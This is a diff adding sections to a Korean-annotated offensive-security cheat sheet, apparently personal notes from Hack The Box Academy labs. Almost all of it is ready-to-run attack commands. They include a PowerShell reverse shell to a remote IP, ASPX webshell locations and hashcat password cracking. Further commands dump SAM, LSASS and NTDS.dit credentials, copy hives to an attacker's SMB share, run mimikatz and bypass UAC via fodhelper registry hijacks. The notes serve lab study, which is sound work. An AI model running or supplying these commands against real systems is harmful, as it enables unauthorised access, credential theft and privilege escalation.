@@ -598,3 +598,200 @@ Internet Archive의 Wayback Machine을 통해 과거 웹사이트 스냅샷을 �
 ```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
+
+## aspx webshell location
+```bash
+# add ip address
+/usr/share/laudanum/aspx/shell.aspx
+
+# change username and password
+/usr/share/nishang/Antak-WebShell/antak.aspx
+```
+
+---
+# Password Attack
+- hash에 대해서 항상 cracking을 먼저 시도해본 뒤에 `pass the hash` 사용
+## shasum
+```bash
+echo -n <password> | sha1sum
+echo -n <password> | sha256sum
+echo -n <password> | md5sum
+```
+
+## cewl
+```bash
+cewl -m 2 --with-numbers --lowercase <url>
+```
+
+## hashcat
+```bash
+hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
+
+hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
+
+# 새로운 rule 만들기
+hashcat -r rules cewl.txt --stdout > output
+
+# output 뒤에 output을 붙이는 과정
+hashcat -a 1 output output --stdout > final
+```
+
+## Cracking OpenSSL encrypted GZIP files
+```bash
+for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
+```
+
+## Cracking BitLocker-encrypted drives(vhd file)
+```bash
+bitlocker2john -i Backup.vhd > backup.hashes
+
+grep "bitlocker\$0" backup.hashes > backup.hash
+
+cat backup.hash
+```
+```bash
+sudo mkdir -p /media/bitlocker
+
+sudo mkdir -p /media/bitlockermount
+
+sudo losetup -f -P Backup.vhd
+
+sudo losetup -a
+
+sudo kpartx -av /dev/loop0
+
+ls /dev/mapper
+
+sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
+
+sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
+
+cd /media/bitlockermount/
+
+sudo umount /media/bitlockermount
+
+sudo umount /media/bitlocker
+```
+
+## default credentials
+```bash
+pip3 install defaultcreds-cheat-sheet
+
+creds search linksys
+```
+
+## Attacking SAM, SYSTEM, and SECURITY
+```powershell
+reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\system C:\system.save
+reg.exe save hklm\security C:\security.save
+```
+```bash
+sudo impacket-smbserver -smb2support CompData /home/ltnbob/Documents/
+```
+- `CompData` : 공유 이름
+- `/home/ltnbob/Documents/` : 실제 공유 경로
+```powershell
+move sam.save \\10.10.15.16\CompData
+move security.save \\10.10.15.16\CompData
+move system.save \\10.10.15.16\CompData
+```
+```bash
+impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
+```
+- 수집된 hash decrypt 해보기.
+
+## DCC2 hashes
+```bash
+# secretsdump로 덤핑 했을 때 나옴.
+inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
+
+hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
+```
+
+## Remote Dumping
+```bash
+netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+
+netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+```
+
+## Dumping LSASS
+```powershell
+# RDP login
+1. Open Task Manager
+2. Select the Processes tab
+3. Find and right click the Local Security Authority Process
+4. Select Create dump file
+```
+```powershell
+# Find LSASS's PID In cmd
+tasklist /svc
+
+# Find LSASS's PID In Powershell
+Get-Process lsass
+
+# 관리자 권한 + SeDebugPrivilege 
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump <pid> C:\lsass.dmp full
+```
+```bash
+pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
+```
+
+## credentials with cmdkey
+```powershell
+cmdkey /list
+```
+<img width="567" height="126" alt="image" src="https://github.com/user-attachments/assets/d6cb984e-57e5-4846-8b63-b896908a3aec" />
+
+- Interactive means that the credential is used for interactive logon sessions.
+
+```powershell
+runas /savecred /user:SRV01\mcharles cmd
+```
+```powershell
+# administrators group에 속해있는지 확인
+whoami /all
+
+# UAC bypass
+reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
+
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
+
+mimikatz.exe
+privilege::debug
+sekurlsa::credman
+vault::cred
+```
+<img width="822" height="359" alt="image" src="https://github.com/user-attachments/assets/cf12ff6c-14ab-4a65-8793-7cdc70c14cf0" />
+
+## Creating a custom list of usernames
+```bash
+./username-anarchy -i /home/ltnbob/names.txt
+
+./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
+```
+
+## NTDS.dit
+```powershell
+net user <user>
+net user <user> /domain
+```
+- `NTDS.dit`를 얻기 위해서 Administrators 그룹이거나 Domain Admins 그룹에 속해 있어야 한다.
+<img width="955" height="265" alt="image" src="https://github.com/user-attachments/assets/446d1628-350e-4158-84a3-441c2a263655" />
+
+```powershell
+vssadmin CREATE SHADOW /For=C:
+
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+
+cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
+```
+```bash
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+```
+```bash
+netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
+```
